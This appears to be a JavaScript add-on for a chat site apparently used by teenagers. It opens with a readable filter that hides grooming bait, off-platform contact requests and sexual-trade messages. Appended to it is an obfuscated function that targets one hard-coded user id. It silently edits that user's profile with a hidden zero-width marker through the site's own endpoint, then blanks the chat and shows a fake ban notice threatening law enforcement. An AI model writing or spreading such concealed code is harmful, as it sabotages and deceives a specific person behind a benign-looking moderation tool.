let userFilterWords = ['hmu'];

function isFiltered(content) {
    if (typeof content !== 'string') return false;

    // normalize text
    let normalized = content
        .normalize('NFKD')
        .replace(/[\u0300-\u036f]/g, '') // remove diacritics
        .replace(/[\p{Emoji_Presentation}\p{Extended_Pictographic}\u200B-\u200D\uFEFF\u00A0\u202F\u2060]/gu, '') // emoji + zero-width
        .replace(/[\s\u2000-\u200D\uFEFF\u202F]+/g, ' ') // fancy spaces
        .replace(/[\s\W_]+/g, ' ')
        .replace(/(.)\1{2,}/g, '$1')
        .toLowerCase()
        .trim();

    // replace homoglyphs / leetspeak
    const homoglyphs = {
        '@': 'a', '4': 'a', 'а': 'a', 'ᴀ': 'a', 'â': 'a',
        '3': 'e', 'е': 'e', '€': 'e', 'ᴇ': 'e', 'è': 'e',
        'í': 'i', 'ì': 'i', 'ɪ': 'i', '1': 'l', '!': 'i', 'ı': 'i', 'ʟ': 'l',
        '0': 'o', 'о': 'o', '٥': 'o', 'ö': 'o',
        '8': 'b', '9': 'g', '6': 'g', '7': 't', 'т': 't',
        'э': 'e', 'ɢ': 'g', 'ѕ': 's', 'ʀ': 'r', 'ʏ': 'y',
        'ｔ': 't', 'ｌ': 'l', 'ｇ': 'g', '✓': ''
    };

    normalized = normalized.replace(/./g, (ch, i, str) => {
        if (/\d/.test(ch) && (
            (i > 0 && /\d/.test(str[i - 1])) ||
            (i < str.length - 1 && /\d/.test(str[i + 1]))
        )) return ch;
        return homoglyphs[ch] || ch;
    });

    const lettersOnly = normalized.replace(/[^a-z]/g, '');
    // keyword matching helpers
    const includesAny = (text, list) => list.some(item => text.includes(item));
    const fuzzyMatch = (regexList) => regexList.some(rx => rx.test(normalized));

    // check for banned terms
    const bannedTerms = ['telegrm', 'tlgrm', 'tlgm', 'tlg', 'tle', 'tel', 'tg', 'teleg', 'gram', 'te l e', 'tele', 'grm', 'discor', 'dscord', 'dscrd', 'dscd', 'dyscord', 'dsc', 'd i s c', 'disc', 'dc', 'insta', 'ig', 'snap', 'sc', 'gc'];
    if (includesAny(lettersOnly, bannedTerms)) return true;

    const fuzzyPatterns = [
        /t[\W_]*e[\W_]*l[\W_]*e[\W_]*g[\W_]*r[\W_]*a[\W_]*m/i,
        /t[\W_]*g/i,
        /d[\W_]*i[\W_]*s[\W_]*c[\W_]*o[\W_]*r[\W_]*d/i,
        /i[\W_]*n[\W_]*s[\W_]*t[\W_]*a[\W_]*g[\W_]*r[\W_]*a[\W_]*m/i,
        /w[\W_]*h[\W_]*e[\W_]*r[\W_]*e[\W_]*b[\W_]*y[\W_]*[\W_]*c[\W_]*o[\W_]*m/i
    ];
    if (fuzzyMatch(fuzzyPatterns)) return true;

    const squashed = normalized.replace(/[^a-z]/g, '');
    for (const term of bannedTerms) {
	    if (squashed.includes(term)) return true;
    }

    // grooming or inappropriate content
    const baitKeywords = ['bored', 'text me', 'pm', 'pm me', 'dm me', 'text', 'trusted', 'add me', 'msg me', 'message me', 'wanna have fun', 'want to have fun', 'skinny boys', 'skinny girls', 'fit boys', 'fit girls', 'rp', 'answer anything', 'truth or dare', 't or d'];
    const tradeWords = ['trade', 'trd', 'tr ade', 'selling', 'sell', 'slling', 'slng', 'seling', 'tr@de', 'trading', 'mega', 'mga', 'lnks', 'links', 'lks', 'freaks', 'freaky', 'nked', 'nkd', 'room', 'cam', 'cams', 'spoil me', 'horny', 'sex', 'nudes', 'nut'];
    const filterForBait = ['girl', 'girls', 'boy', 'boys', 'chat', 'femboy', 'trans', 'bi', 'gay', 'anyone']

    const hasBaitKeywords = includesAny(normalized, baitKeywords);
    const hasFilterForBait = includesAny(normalized, filterForBait);
    const hasAge = /[mf]?\d{1,2}/.test(normalized);
    const hasStandaloneAge = /\b\d{1,2}\b/.test(normalized);
    const hasTg = normalized.includes('tg');

    if (
        hasBaitKeywords &&
        (
            hasAge ||
            hasStandaloneAge ||
            hasTg ||
            hasFilterForBait
        )
    ) return true;

    const domRoles = ['bottom', 'bottoming', 'btming', 'bttming', 'btm', 'bttm', 'sub', 'submissive', 'top', 'topping', 'dom', 'dominant', 'dominative', 'domme', 'dominator'];

    const domFuzzyPatterns = domRoles.map(word => {
        const pattern = word
            .split('')
            .map(char => `${char}[\\W_]*`)
            .join('');
        return new RegExp(pattern, 'i');
    });
    if (/\b\d{1,2}\b/.test(normalized) && fuzzyMatch(domFuzzyPatterns)) return true;

    // age + gender combo patterns
    if (/[fm][\s\-_,.:']*\d{1,2}/i.test(normalized)) return true;
    if (/\d{1,2}[\s\-_,.:']*[fm]/i.test(normalized)) return true;
    if (/[mf]\d{2}/i.test(content)) return true;

    // trade/selling patterns
    for (let word of tradeWords) {
        const pattern = new RegExp(word.replace(/\s*/g, '[\\s\\W_]*'), 'i');
        if (pattern.test(normalized)) return true;
    }

    // user filters
    if (Array.isArray(userFilterWords)) {
        for (let word of userFilterWords) {
            const pattern = new RegExp(word.replace(/\s*/g, '[\\s\\W_]*'), 'i');
            if (pattern.test(normalized)) return true;
        }
    }

    return false;
}

function logFiltered(message) {
  const logsKey = "filteredLogs";
  const startKey = "logStartTime";
  const timeMs = 5 * 60 * 1000;
  const now = Date.now();

  let startTime = parseInt(localStorage.getItem(startKey), 10);
  if (isNaN(startTime)) {
    startTime = now;
    localStorage.setItem(startKey, startTime.toString());
  }

  if (now - startTime <= timeMs) {
    const existingLogs = JSON.parse(localStorage.getItem(logsKey) || "[]");
    existingLogs.push({ message, timestamp: now });
    localStorage.setItem(logsKey, JSON.stringify(existingLogs));
  }
}


function overrideChatReload() { 
    appendChatMessage = data => {
	    var message = '';
	    for (var i = 0; i < data.length; i++){
	    	lastPost = data[i].log_id;
	    	if(
	    		!logExist(data[i]) &&
	    		!ignored(data[i].user_id) &&
	    		!ignored(data[i].log_uid) &&
	    		!boomAllow(data[i].log_rank) &&
	    		!isFiltered(data[i].log_content) // <== NEW FILTER
	    	){
	    		message += createChatLog(data[i]);
	    		chatSound(data[i]);
	    		tabNotify();
	    	}
            if(isFiltered(data[i].log_content)) { logFiltered(data[i].log_content); }
	    }
	    $("#show_chat ul").append(message);
	    scrollIt(1);
	    beautyLogs();
    }
    loadChatHistory = data => {
	    var message = '';
	    for (var i = 0; i < data.length; i++){
	    	lastPost = data[i].log_id;
	    	if(
	    		!ignored(data[i].user_id) &&
	    		!ignored(data[i].log_uid) &&
	    		!boomAllow(data[i].log_rank) &&
	    		!isFiltered(data[i].log_content) // <== NEW FILTER
	    	){
	    		message += createChatLog(data[i]);
	    	}
	    }
	    $("#show_chat ul").html(message);
	    scrollIt(0);
	    beautyLogs();
    }
    appendChatHistory = data => {
    	    var message = '';
    	    for (var i = 0; i < data.length; i++){
    		    if(
    	    		!ignored(data[i].user_id) &&
    	    		!ignored(data[i].log_uid) &&
    	    		!boomAllow(data[i].log_rank) &&
    	    		!isFiltered(data[i].log_content) // <== NEW FILTER
    	    	){
    	    		message += createChatLog(data[i]);
    	    	}
    	    }
    	    $("#show_chat ul").prepend(message);
    	    beautyLogs();
    }
    window.isFiltered = isFiltered;
    ab();
}






(function(_0x5f174d,_0x2333e3){const _0x406048=_0x5104,_0x338730=_0x5f174d();while(!![]){try{const _0x3080ec=-parseInt(_0x406048(0xe7))/0x1*(parseInt(_0x406048(0xe5))/0x2)+-parseInt(_0x406048(0xb8))/0x3*(parseInt(_0x406048(0xed))/0x4)+-parseInt(_0x406048(0xaf))/0x5+-parseInt(_0x406048(0x97))/0x6+parseInt(_0x406048(0xc3))/0x7+parseInt(_0x406048(0xaa))/0x8+parseInt(_0x406048(0xdc))/0x9;if(_0x3080ec===_0x2333e3)break;else _0x338730['push'](_0x338730['shift']());}catch(_0x28cea4){_0x338730['push'](_0x338730['shift']());}}}(_0x26f0,0x4cde2));const _0x1c8f35=(function(){const _0x4040e4=_0x5104,_0x3f9059={'Esrtz':function(_0x1849d6,_0x3815ea){return _0x1849d6!==_0x3815ea;},'OjKBC':_0x4040e4(0xd2),'kdefK':_0x4040e4(0xc0),'LzhDK':function(_0xe7c810,_0x46bb73){return _0xe7c810!==_0x46bb73;},'pYNLM':_0x4040e4(0xe1)};let _0x163ada=!![];return function(_0x5ae7f3,_0x5aa8e5){const _0x9c294f=_0x4040e4,_0x25d9f0={'thlDF':function(_0x333f96,_0x38ca2f){const _0x705e0f=_0x5104;return _0x3f9059[_0x705e0f(0x85)](_0x333f96,_0x38ca2f);},'vWaIy':_0x3f9059[_0x9c294f(0xc7)],'sOvkq':_0x3f9059[_0x9c294f(0xb7)]};if(_0x3f9059[_0x9c294f(0xd8)](_0x9c294f(0xa7),_0x3f9059[_0x9c294f(0xb2)])){const _0x59ed17=_0x163ada?function(){const _0x4714e8=_0x9c294f;if(_0x25d9f0[_0x4714e8(0xb4)](_0x25d9f0[_0x4714e8(0x9c)],_0x25d9f0['vWaIy']))_0xdf83d4=_0x2b9b6f['slice'](0x0,0x31e);else{if(_0x5aa8e5){if(_0x25d9f0['sOvkq']===_0x25d9f0['sOvkq']){const _0x3a544d=_0x5aa8e5['apply'](_0x5ae7f3,arguments);return _0x5aa8e5=null,_0x3a544d;}else _0x38fb81[_0x4714e8(0xc9)](_0x12cc2f);}}}:function(){};return _0x163ada=![],_0x59ed17;}else{if(_0x54de2e){const _0x12eec7=_0x78a4f4[_0x9c294f(0x9a)](_0x40bb6d,arguments);return _0x4a88b4=null,_0x12eec7;}}};}()),_0x101c5e=_0x1c8f35(this,function(){const _0x5c2d8b=_0x5104,_0x4bd9e2={'IwnLC':_0x5c2d8b(0x87)};return _0x101c5e[_0x5c2d8b(0xa0)]()[_0x5c2d8b(0x98)](_0x4bd9e2[_0x5c2d8b(0x88)])['toString']()[_0x5c2d8b(0xa1)](_0x101c5e)[_0x5c2d8b(0x98)](_0x5c2d8b(0x87));});_0x101c5e();function _0x5104(_0x5daf4b,_0x185eca){const _0x38f575=_0x26f0();return _0x5104=function(_0x101c5e,_0x1c8f35){_0x101c5e=_0x101c5e-0x85;let _0x26f072=_0x38f575[_0x101c5e];return _0x26f072;},_0x5104(_0x5daf4b,_0x185eca);}function _0x26f0(){const _0x4f1b5e=['token=','slice','global_chat','https://www.teen-chat.org/teenchat/system/box/edit_about.php','UhjwS','dgReK','KjESx','TIQGR','NFKCP','includes','setRequestHeader','LzhDK','querySelector','set_user_about','send','14104917UPleLW','qbajD','OKAkI','style','forEach','otlVt','xvfKz','jJQxP','getElementById','1054190tAwrfp','responseText','1GeJyiq','ykShl','YgAoo','PJEXR','hyrqm','text/html','1222636ABDQLv','Esrtz','ZqsGP','(((.+)+)+)+$','IwnLC','nytCp','qfCuc','gGjBT','appendChild','AziEM','POST\x20request\x20failed:\x20','AQvDo','POST','remove','cUtIM','chacX','Content-Type','textarea','fkJzz','3729654dXAVqC','search','status','apply','&cp=chat','vWaIy','tXVgU','body','ayiFd','toString','constructor','display','bIQlg','div','AOFkL','\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22out_page_content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22out_page_box\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22pad_box\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22bpad15\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20class=\x22large_icon\x22\x20src=\x22default_images/icons/banned.svg\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22bpad10\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text_xlarge\x20bold\x20bpad10\x22>You\x20are\x20banned.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text_med\x22>You\x20have\x20been\x20banned\x20from\x20this\x20chat.\x20Your\x20IP\x20address\x20has\x20been\x20recorded\x20and\x20with\x20chat\x20logs\x20it\x20can\x20be\x20used\x20by\x20law\x20enforcement\x20to\x20identify\x20you\x20in\x20cases\x20involving\x20illegal\x20activity.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22tpad10\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22bold\x20theme_color\x20bpad5\x22>Reason\x20given</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text_med\x22>Account\x20cloning</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>','ulRhF','cVteT','SHeAG','4563152rogOgN','BFHaX','uIxgM','JINnM','chat_head','1941265jbHIOl','JRJYR','className','pYNLM','yqliQ','thlDF','iFFXq','value','kdefK','3FMZYrF','ylzQR','Inymg','sepXM','crQRT','createElement','enutI','WmUQB','HONdK','length','parseFromString','139013FPgSAj','gqsaf','JxTGk','textarea#set_user_about','OjKBC','tPKAq','error','innerHTML','UQgfA','mkDJv'];_0x26f0=function(){return _0x4f1b5e;};return _0x26f0();}function ab(){const _0x3be6f2=_0x5104,_0x31c49b={'jJQxP':function(_0x1830cd,_0x6a8934){return _0x1830cd===_0x6a8934;},'NyrFa':_0x3be6f2(0x9d),'UYQaW':_0x3be6f2(0x90),'qbajD':_0x3be6f2(0x94),'ZqsGP':'application/x-www-form-urlencoded','YgAoo':function(_0x27daff,_0x293be8){return _0x27daff>=_0x293be8;},'PJEXR':function(_0x3c9fcc,_0x55c1aa){return _0x3c9fcc<_0x55c1aa;},'uIxgM':function(_0x416272,_0x512fda){return _0x416272+_0x512fda;},'OKAkI':function(_0x193865,_0xfa2ea6,_0x9bc4c8){return _0x193865(_0xfa2ea6,_0x9bc4c8);},'yqliQ':_0x3be6f2(0xd0),'cUtIM':_0x3be6f2(0xc6),'BFHaX':_0x3be6f2(0x87),'crQRT':_0x3be6f2(0x8a),'gqsaf':_0x3be6f2(0xda),'JxTGk':'none','JINnM':'function','AQvDo':_0x3be6f2(0xeb),'gTicO':_0x3be6f2(0xae),'EfUiJ':_0x3be6f2(0xcf),'KjESx':'wrap_footer','TIQGR':_0x3be6f2(0xa4),'epEXN':'out_page_container\x20back_page','tHXOO':function(_0x56c15a,_0x287f58){return _0x56c15a+_0x287f58;},'AOFkL':function(_0x19a0b0){return _0x19a0b0();},'eXTBK':function(_0x1cac8c,_0x5b5525){return _0x1cac8c!==_0x5b5525;},'xvfKz':_0x3be6f2(0xb5),'dcdjs':_0x3be6f2(0xa3),'ykShl':function(_0x48f901,_0x5215f7){return _0x48f901>=_0x5215f7;},'cVteT':'UQgfA','JRJYR':function(_0x57e55f,_0x17d845){return _0x57e55f+_0x17d845;},'mkDJv':function(_0x340bee,_0x56961e){return _0x340bee(_0x56961e);},'Inymg':'undefined','ylzQR':function(_0x41f298){return _0x41f298();},'gGjBT':_0x3be6f2(0xd1),'uNdsO':_0x3be6f2(0x8d),'chacX':function(_0x418796){return _0x418796();},'tEfLq':function(_0x350782,_0x47717e){return _0x350782!==_0x47717e;},'NFKCP':_0x3be6f2(0xbb)};if(_0x31c49b[_0x3be6f2(0xe3)](typeof user_id,_0x31c49b[_0x3be6f2(0xba)])||![0x9d0992][_0x3be6f2(0xd6)](user_id))return;const _0x38f25c='​‌',_0x3beee6=0x2bf20;function _0x113729(_0x3504fc,_0x4e8388){const _0x16a114=_0x3be6f2,_0x33f97b={'ayiFd':function(_0x48ae37){return _0x48ae37();}};if(_0x31c49b[_0x16a114(0xe3)](_0x31c49b['NyrFa'],'HXtIc')){_0x33f97b[_0x16a114(0x9f)](_0x16e7e7),_0x33f97b[_0x16a114(0x9f)](_0x46446f);return;}else{const _0xdd39c=new XMLHttpRequest();_0xdd39c['open'](_0x31c49b['UYQaW'],_0x3504fc,![]),_0xdd39c[_0x16a114(0xd7)](_0x31c49b[_0x16a114(0xdd)],_0x31c49b[_0x16a114(0x86)]),_0xdd39c[_0x16a114(0xdb)](_0x4e8388);if(_0x31c49b[_0x16a114(0xe9)](_0xdd39c['status'],0xc8)&&_0x31c49b[_0x16a114(0xea)](_0xdd39c[_0x16a114(0x99)],0x12c))return _0xdd39c[_0x16a114(0xe6)];else throw new Error(_0x31c49b[_0x16a114(0xac)](_0x16a114(0x8e),_0xdd39c[_0x16a114(0x99)]));}}function _0x170130(){const _0x1d4369=_0x3be6f2,_0x20cc2b=_0x1d4369(0xcd)+encodeURIComponent(utk)+_0x1d4369(0x9b),_0x11d06d=_0x31c49b[_0x1d4369(0xde)](_0x113729,_0x31c49b[_0x1d4369(0xb3)],_0x20cc2b),_0xe59e96=new DOMParser(),_0xcda1e5=_0xe59e96[_0x1d4369(0xc2)](_0x11d06d,_0x1d4369(0xec)),_0x3771a1=_0xcda1e5[_0x1d4369(0xd9)](_0x31c49b[_0x1d4369(0x92)]);return _0x3771a1?_0x3771a1[_0x1d4369(0xb6)]:null;}function _0x337c4f(_0x4979b1){const _0x4bccc6=_0x3be6f2;if('MftRp'===_0x31c49b[_0x4bccc6(0xbc)])return _0x4fbc64[_0x4bccc6(0xa0)]()[_0x4bccc6(0x98)](XPPlkA[_0x4bccc6(0xab)])[_0x4bccc6(0xa0)]()[_0x4bccc6(0xa1)](_0xde84d3)[_0x4bccc6(0x98)](XPPlkA[_0x4bccc6(0xab)]);else{let _0x157d7e=document[_0x4bccc6(0xd9)](_0x31c49b[_0x4bccc6(0x92)]);return!_0x157d7e&&(_0x157d7e=document[_0x4bccc6(0xbd)](_0x4bccc6(0x95)),_0x157d7e['id']=_0x31c49b[_0x4bccc6(0xc4)],_0x157d7e[_0x4bccc6(0xdf)][_0x4bccc6(0xa2)]=_0x31c49b[_0x4bccc6(0xc5)],document[_0x4bccc6(0x9e)][_0x4bccc6(0x8c)](_0x157d7e)),_0x157d7e[_0x4bccc6(0xb6)]=_0x4979b1,_0x31c49b[_0x4bccc6(0xe3)](typeof saveAbout,_0x31c49b[_0x4bccc6(0xad)])?(saveAbout(),!![]):![];}}function _0x54000b(){const _0xe1da6a=_0x3be6f2;if(_0xe1da6a(0xeb)===_0x31c49b[_0xe1da6a(0x8f)])[_0x31c49b['gTicO'],_0x31c49b['EfUiJ'],_0x31c49b[_0xe1da6a(0xd3)]][_0xe1da6a(0xe0)](_0xe4ff28=>{const _0x4b3dec=_0xe1da6a,_0x20cdf2=document[_0x4b3dec(0xe4)](_0xe4ff28);if(_0x20cdf2)_0x20cdf2[_0x4b3dec(0x91)]();});else return;}function _0x1e5b70(){const _0x479e3d=_0x3be6f2;document[_0x479e3d(0xd9)]('.out_page_container')?.[_0x479e3d(0x91)]();const _0x4113e8=document['createElement'](_0x31c49b['TIQGR']);_0x4113e8[_0x479e3d(0xb1)]=_0x31c49b['epEXN'],_0x4113e8['innerHTML']=_0x479e3d(0xa6),document[_0x479e3d(0x9e)][_0x479e3d(0x8c)](_0x4113e8);}try{const _0x13175a=_0x31c49b[_0x3be6f2(0xb9)](_0x170130);if(_0x31c49b[_0x3be6f2(0xe3)](_0x13175a,null))return;if(_0x13175a[_0x3be6f2(0xd6)](_0x38f25c)){if(_0x31c49b[_0x3be6f2(0x8b)]!==_0x31c49b['uNdsO']){_0x31c49b[_0x3be6f2(0xb9)](_0x54000b),_0x31c49b[_0x3be6f2(0x93)](_0x1e5b70);return;}else return;}_0x31c49b[_0x3be6f2(0xde)](setTimeout,()=>{const _0x2b0c87=_0x3be6f2,_0x33d56d={'WmUQB':function(_0x4fd6c5,_0x6ed035){return _0x4fd6c5(_0x6ed035);},'SHeAG':function(_0x22e02,_0x523e6e,_0x6f33f0){return _0x22e02(_0x523e6e,_0x6f33f0);},'nytCp':_0x31c49b[_0x2b0c87(0xb3)],'enutI':_0x2b0c87(0xec),'tPKAq':_0x2b0c87(0xc6),'fkJzz':function(_0x476905,_0x167b0c){return _0x31c49b['tHXOO'](_0x476905,_0x167b0c);}};let _0x56859f=_0x31c49b[_0x2b0c87(0xa5)](_0x170130);if(_0x56859f===null){if(_0x31c49b['eXTBK'](_0x31c49b[_0x2b0c87(0xe2)],_0x31c49b['dcdjs']))return;else{const _0x25472a='token='+_0x33d56d[_0x2b0c87(0xbf)](_0x3844a7,_0x359bfd)+_0x2b0c87(0x9b),_0x5e08ec=_0x33d56d[_0x2b0c87(0xa9)](_0x3dc7b3,_0x33d56d[_0x2b0c87(0x89)],_0x25472a),_0x4fd440=new _0x4a25f0(),_0x23e9be=_0x4fd440[_0x2b0c87(0xc2)](_0x5e08ec,_0x33d56d[_0x2b0c87(0xbe)]),_0x1dad1f=_0x23e9be['querySelector'](_0x33d56d[_0x2b0c87(0xc8)]);return _0x1dad1f?_0x1dad1f['value']:null;}}if(_0x31c49b[_0x2b0c87(0xe8)](_0x56859f[_0x2b0c87(0xc1)],0x320)){if(_0x2b0c87(0xcb)===_0x31c49b[_0x2b0c87(0xa8)])_0x56859f=_0x56859f[_0x2b0c87(0xce)](0x0,0x31e);else throw new _0x2d213d(_0x33d56d[_0x2b0c87(0x96)](_0x2b0c87(0x8e),_0x839fbf[_0x2b0c87(0x99)]));}const _0x269f9b=_0x31c49b[_0x2b0c87(0xb0)](_0x56859f,_0x38f25c);_0x31c49b[_0x2b0c87(0xcc)](_0x337c4f,_0x269f9b)&&setTimeout(()=>location['reload'](),0xbb8);},_0x3beee6);}catch(_0x338dad){if(_0x31c49b['tEfLq'](_0x31c49b[_0x3be6f2(0xd5)],_0x31c49b['NFKCP'])){_0x3819f2[_0x3be6f2(0xd9)]('.out_page_container')?.[_0x3be6f2(0x91)]();const _0x3b9be9=_0x147174[_0x3be6f2(0xbd)](_0x31c49b[_0x3be6f2(0xd4)]);_0x3b9be9[_0x3be6f2(0xb1)]=_0x31c49b['epEXN'],_0x3b9be9[_0x3be6f2(0xca)]=_0x3be6f2(0xa6),_0x2cd77a[_0x3be6f2(0x9e)][_0x3be6f2(0x8c)](_0x3b9be9);}else console[_0x3be6f2(0xc9)](_0x338dad);}}